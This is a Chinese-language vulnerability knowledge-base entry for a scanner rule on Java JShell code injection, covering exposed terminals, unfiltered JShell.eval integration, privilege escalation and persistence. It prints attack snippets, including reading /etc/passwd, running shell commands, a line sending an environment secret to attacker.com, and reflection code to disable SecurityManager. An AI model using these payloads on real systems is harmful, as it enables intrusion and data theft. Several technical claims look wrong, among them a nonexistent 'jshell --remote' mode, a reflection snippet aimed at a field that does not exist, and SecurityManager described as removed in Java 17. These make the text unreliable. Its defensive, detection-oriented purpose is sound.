# Java JShell 代码执行漏洞 完整描述

> 规则 ID：`any_jshell_codei` · 类别：codei · 关键 sink：JShell, eval
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java JShell 代码执行漏洞 完整描述
JShell 是 Java 9 引入的交互式命令行工具，用于快速执行 Java 代码片段、调试和原型开发，其核心设计目标是简化 Java 代码的即时执行。但因 JShell 的**运行机制、权限控制设计缺陷** 或 **不当配置**，可能导致未授权代码执行、权限提升甚至服务器接管等安全风险，以下从漏洞本质、触发场景、各类变种情况等维度完整剖析：

#### 一、漏洞核心本质
JShell 的核心风险源于其 **“无隔离的即时执行特性”**：
1. JShell 执行代码时直接运行在当前 JVM 进程中，共享进程的系统权限、内存空间、类加载器上下文；
2. JShell 未默认限制危险 API/操作（如文件读写、进程执行、网络通信），且默认启用 `--add-modules ALL-SYSTEM` 以支持全系统模块访问；
3. 若 JShell 被暴露到非可信环境（如公网、未授权用户可访问的服务），攻击者可通过提交恶意代码片段，以 JShell 进程的权限执行任意操作。

#### 二、漏洞触发的前提条件
JShell 代码执行漏洞的触发需满足至少以下一个条件：
1. **JShell 进程被非授权访问**：如 JShell 服务绑定公网 IP、未做身份验证；
2. **应用集成 JShell 时未做安全限制**：如业务系统（如在线编程平台、调试工具）集成 JShell 核心 API（`jdk.jshell` 包），但未过滤危险操作；
3. **JVM 启动参数配置不当**：如未禁用 JShell 相关模块、未限制权限；
4. **本地 JShell 被提权利用**：如低权限用户通过本地 JShell 绕过系统权限限制（如利用 JVM 进程的高权限）。

#### 三、漏洞的各类触发场景与具体表现
##### 场景 1：直接暴露 JShell 交互式终端（最基础场景）
- **触发方式**：攻击者通过远程登录（如 SSH、RDP）、端口转发或公网暴露的 JShell 终端（如 `jshell --remote` 模式），直接进入 JShell 交互环境；
- **执行效果**：以 JShell 进程所属用户权限执行任意 Java 代码，例如：
  ```java
  // 读取系统敏感文件
  Files.readAllLines(Paths.get("/etc/passwd"));
  // 执行系统命令（Linux）
  new ProcessBuilder("/bin/bash", "-c", "whoami").start().getInputStream();
  // 执行系统命令（Windows）
  new ProcessBuilder("cmd.exe", "/c", "ipconfig").start().getInputStream();
  // 发起网络请求（外连数据）
  new URL("http://attacker.com/leak?data=" + System.getenv("SECRET")).openStream();
  ```
- **风险等级**：高危（完全控制 JShell 进程权限范围内的系统资源）。

##### 场景 2：应用集成 JShell API 未做限制（最常见的业务场景）
很多应用（如在线教学平台、代码调试工具、低代码平台）会通过 `jdk.jshell.JShell` 类集成 JShell 功能，若未做安全过滤，会导致恶意代码执行：
- **核心 API 调用流程（无限制版）**：
  ```java
  // 初始化 JShell 实例（默认无限制）
  JShell jshell = JShell.create();
  // 执行用户提交的代码片段
  String userCode = request.getParameter("code"); // 攻击者可控的输入
  List<SnippetEvent> events = jshell.eval(userCode);
  // 返回执行结果（直接泄露）
  events.forEach(e -> response.getWriter().write(e.value()));
  ```
- **攻击者利用方式**：
  - 提交文件操作代码：删除应用核心配置文件（如 `application.properties`）；
  - 提交进程执行代码：植入挖矿程序、反向 Shell；
  - 提交反射代码：绕过应用层限制（如调用 `System.exit(0)` 终止服务）；
  - 提交内存操作代码：触发 OOM 导致服务不可用。

##### 场景 3：JShell 远程执行模式（`--remote`/`--execution`）
JShell 支持远程执行模式（通过 `jshell --remote <host>:<port>` 或自定义执行引擎），若：
1. 远程 JShell 服务未认证；
2. 执行引擎配置为“无限制”；
攻击者可通过网络直接向远程 JShell 服务提交恶意代码，表现为：
- 跨主机执行系统命令；
- 读取远程服务器敏感数据；
- 横向移动（利用 JShell 进程权限访问内网其他服务）。

##### 场景 4：JShell 与模块化/权限管理的绕过
Java 9+ 的模块化系统（Module）和安全管理器（SecurityManager）理论上可限制 JShell，但存在以下绕过场景：
- **绕过模块化限制**：JShell 默认启用 `ALL-SYSTEM` 模块，攻击者可通过 `ModuleLayer` 加载自定义模块，调用受限 API（如 `sun.misc.Unsafe`）；
- **绕过 SecurityManager**：若 JVM 未正确配置安全策略（`java.security.policy`），JShell 可通过反射禁用 SecurityManager：
  ```java
  // 反射禁用安全管理器（Java 8/9 部分版本可行）
  Class<?> smClass = Class.forName("java.lang.SecurityManager");
  Field field = smClass.getDeclaredField("securityManager");
  field.setAccessible(true);
  field.set(null, null);
  ```
- **绕过类加载限制**：JShell 使用自定义类加载器（`JShellClassLoader`），攻击者可通过类加载器注入恶意类，绕过应用层的类白名单限制。

##### 场景 5：本地提权利用 JShell
若本地低权限用户可启动 JShell（如 JDK 安装目录对普通用户可执行），且 JVM 进程以高权限运行（如 root/Administrator），则：
- 低权限用户通过 JShell 执行高权限命令（如 `chmod 777 /etc/shadow`）；
- 篡改高权限进程的文件（如替换应用服务器的 jar 包）；
- 利用 JShell 的内存写入能力修改高权限进程的运行时数据。

##### 场景 6：JShell 持久化攻击
攻击者利用 JShell 实现恶意代码持久化，例如：
- 通过 JShell 向系统启动目录写入脚本（如 `~/.bashrc`、`C:\Windows\Startup`），实现开机自启；
- 通过 JShell 动态修改 JVM 运行时类（如替换 `java.lang.String` 的 `equals` 方法），植入后门；
- 通过 JShell 写入定时任务（如 `crontab`、Windows 计划任务），定期执行恶意代码。

#### 四、漏洞影响范围与危害
1. **数据安全**：泄露敏感配置（如数据库密码）、用户数据、系统密钥；
2. **系统安全**：服务器被接管、植入恶意程序、数据被篡改/删除；
3. **服务可用性**：触发 OOM、死循环、进程终止，导致业务中断；
4. **合规风险**：违反数据保护法规（如 GDPR、等保），因未授权代码执行导致数据泄露；
5. **内网渗透**：利用 JShell 进程的内网权限横向移动，攻击其他服务器。

#### 五、漏洞的特殊触发条件与边界情况
1. **JDK 版本差异**：
   - Java 9-11：JShell 功能不完善，部分绕过方法（如禁用 SecurityManager）可行；
   - Java 12+：JShell 增加了部分安全限制（如默认禁用 `Unsafe`），但仍可通过反射绕过；
   - Java 17+：移除 SecurityManager（已标记为废弃），需依赖模块化和密封类限制，但仍存在漏洞；
2. **操作系统差异**：
   - Linux：JShell 执行系统命令更灵活（如 `bash -c`），且权限分离更严格，提权风险更高；
   - Windows：可通过 JShell 调用 `powershell` 执行恶意脚本，或利用 COM 组件实现持久化；
3. **容器/云环境**：若 JShell 运行在容器中，攻击者可通过 JShell 突破容器隔离（如挂载宿主机目录、访问 Docker 守护进程）；
4. **无交互模式下的利用**：JShell 支持 `--execution local -s`（无交互模式），攻击者可通过管道提交代码（如 `echo "Runtime.getRuntime().exec('whoami')" | jshell`），实现无交互执行。

综上，JShell 代码执行漏洞的核心是“即时执行特性与权限控制的失衡”，其触发场景覆盖远程/本地、交互/非交互、应用集成/原生终端等全维度，危害程度取决于 JShell 进程的权限、暴露范围及防护措施的完善程度。

